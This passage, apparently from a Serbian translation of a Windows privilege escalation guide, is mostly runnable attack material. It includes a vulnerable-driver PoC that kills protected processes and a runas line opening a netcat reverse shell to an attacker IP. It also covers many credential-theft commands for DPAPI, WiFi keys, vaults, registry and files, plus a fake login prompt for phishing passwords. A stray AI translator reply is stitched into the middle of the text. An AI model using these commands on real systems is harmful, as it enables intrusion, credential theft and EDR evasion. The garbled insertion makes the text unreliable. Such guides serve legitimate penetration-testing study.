Jednom kada korisnik može otvoriti device, privilegovani IOCTLs koje drajver izlaže mogu se zloupotrebiti za LPE i manipulaciju. Primeri mogućnosti zabeleženih u prirodi:
- Vratiti handle-ove sa punim pristupom ka proizvoljnim procesima (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Neograničen raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminirati proizvoljne procese, uključujući Protected Process/Light (PP/PPL), omogućavajući AV/EDR kill iz korisničkog prostora preko kernela.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigacije za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja device objekata koji treba da budu ograničeni DACL-om.
- Validirajte kontekst pozivaoca za operacije koje zahtevaju privilegije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-a.
- Ograničite IOCTLs (access masks, METHOD_*, input validation) i razmotrite brokered modele umesto direktnih kernel privilegija.

Ideje za detekciju za odbrambene timove
- Nadzor user-mode otvaranja sumnjivih imena uređaja (npr. \\ .\\amsdk*) i specifičnih IOCTL sekvenci koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/odbijenih.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Mreža

### Deljeni resursi
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li su u hosts fajlu hardkodirani drugi poznati računari.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite dostupnost **ograničenih servisa** iz spoljašnjosti
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Pravila vatrozida

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binar `bash.exe` se takođe može naći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user, možete slušati na bilo kom portu (prvi put kada koristite `nc.exe` da slušate na portu, GUI će pitati da li `nc` treba biti dozvoljen firewall-u).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati sa `--default-user root`

Možete istražiti `WSL` fajl sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows kredencijali

### Winlogon kredencijali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadžer akreditiva / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke akreditive za servere, web-sajtove i druge programe za koje **Windows** može **automatski da prijavi korisnike**. Na prvi pogled, može delovati kao da korisnici mogu da sačuvaju svoje Facebook credentials, Twitter credentials, Gmail credentials itd., kako bi se automatski prijavljivali preko pregledača. Ali nije tako.

Windows Vault čuva akreditive koje **Windows** može automatski da koristi za prijavu korisnika, što znači da bilo koja **Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (server ili web-sajt) **može koristiti ovaj Credential Manager** i Windows Vault i koristitiće predate akreditive umesto da korisnici stalno unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager, mislim da nije moguće da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, treba nekako **komunicirati sa credential manager i zatražiti akreditive za taj resurs** iz podrazumevanog skladišnog vault-a.

Koristite `cmdkey` da prikažete sačuvane akreditive na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` da biste iskoristili sačuvane kredencijale. Sledeći primer poziva remote binary putem SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa zadatim skupom credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ili iz [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** pruža metodu za simetrično šifrovanje podataka, prvenstveno korišćenu u Windows operativnom sistemu za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.

**DPAPI omogućava šifrovanje ključeva putem simetričnog ključa koji je izveden iz korisničkih login tajni**. U scenarijima koji uključuju sistemsko šifrovanje, koristi sistemske tajne za autentifikaciju domena.

Šifrovani korisnički RSA ključevi, koristeći DPAPI, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što onemogućava listanje njegovog sadržaja pomoću komande `dir` u CMD, iako se može listati preko PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da ga dešifrujete.

**credentials files protected by the master password** obično se nalaze u:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.  
Možete **extract many DPAPI** **masterkeys** from **memory** koristeći modul `sekurlsa::dpapi` (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

PowerShell credentials se često koriste za skriptovanje i zadatke automatizacije kao zgodan način za čuvanje šifrovanih kredencijala. Kredencijali su zaštićeni pomoću DPAPI, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste dešifrovali PS credentials iz fajla koji ih sadrži, možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Bežične mreže
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Upravitelj kredencijala za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proveri da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri su **pokrenuti sa SYSTEM privileges**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fajlovi i Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u registru pod ključem `HKCU\Software\OpenSSH\Agent\Keys`, pa bi trebalo da proverite da li se tamo nalazi nešto zanimljivo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos unutar te putanje, verovatno je sačuvan SSH key. Sačuvan je šifrovan, ali se lako može dešifrovati koristeći [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako servis `ssh-agent` nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram nekoliko ssh ključeva, dodam ih pomoću `ssh-add` i prijavim se putem ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom asimetrične autentifikacije ključeva.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove datoteke koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rezervne kopije
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite fajl pod imenom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala raspoređivanje prilagođenih lokalnih administratorskih naloga na grupu mašina putem Group Policy Preferences (GPP). Međutim, ova metoda je imala značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji se čuvaju kao XML fajlovi u SYSVOL-u, mogli su biti pristupljeni od strane bilo kog korisnika domena. Drugo, lozinke unutar ovih GPP-ova, šifrovane AES256 koristeći javno dokumentovani podrazumevani ključ, mogle su biti dešifrovane od strane bilo kog autentifikovanog korisnika. To je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima dobijanje povišenih privilegija.

Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Po pronalasku takvog fajla, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Taj objekat sadrži detalje o GPP-u i lokaciji fajla, pomažući u identifikaciji i otklanjanju ovog bezbednosnog propusta.

Pretražite u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_ za sledeće fajlove:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword-a:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web konfiguracija
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config fajla sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kredencijali
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatraži credentials

Uvek možeš **zamoliti korisnika da unese svoje credentials ili čak credentials drugog korisnika** ako misliš da ih on zna (imaj na umu da je **pitati** klijenta direktno za **credentials** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže credentials**

Poznati fajlovi koji su pre nekog vremena sadržali **passwords** u **clear-text** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the files to search. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (and any other proposed files) you want translated, or grant access/provide the file list.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u RecycleBin

Takođe treba da proverite Bin da biste potražili kredencijale u njemu

Za **oporavak lozinki** sačuvanih od strane više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra koji sadrže kredencijale**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Treba da proverite dbs gde su sačuvane lozinke iz **Chrome or Firefox**.\
Takođe proverite istoriju, bookmarke i favourite pregledača — možda su neke **lozinke** sačuvane tamo.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) je tehnologija ugrađena u Windows operativni sistem koja omogućava međusobnu komunikaciju između softverskih komponenti napisanih u različitim jezicima. Svaka COM komponenta je identifikovana putem class ID (CLSID) i svaka komponenta izlaže funkcionalnost kroz jedan ili više interfejsa, identifikovanih putem interface IDs (IIDs).

COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete naći podregistar **InProcServer32** koji sadrži podrazumevanu vrednost koja pokazuje na **DLL** i vrednost nazvanu **ThreadingModel** koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

U suštini, ako možete **prepisati bilo koji od DLL-ova** koji će biti izvršeni, možete **eskalirati privilegije** ako taj DLL bude izvršen od strane drugog korisnika.

Da saznate kako napadači koriste COM Hijacking kao mehanizam za persistenciju, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generička pretraga lozinki u fajlovima i registru**

**Pretraži sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Potražite fajl određenog imena**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registar za imena ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvrši svaki metasploit POST module koji traži credentials** unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže passwords pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za ekstrakciju password-a iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** iz više alata koji čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Deljeni segmenti memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkcionalnost pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo je slično client/server arhitekturi, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada klijent pošalje podatke kroz pipe, server koji je postavio pipe ima mogućnost da **preuzme identitet** klijenta, pod uslovom da poseduje potrebna prava **SeImpersonate**. Pronalaženje **privilegisanog procesa** koji komunicira preko pipe-a koji možete oponašati pruža priliku za **dobijanje viših privilegija** preuzimanjem identiteta tog procesa kada on stupi u interakciju sa pipe-om koji ste vi uspostavili. Za uputstva kako izvesti takav napad, korisni vodiči su dostupni [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

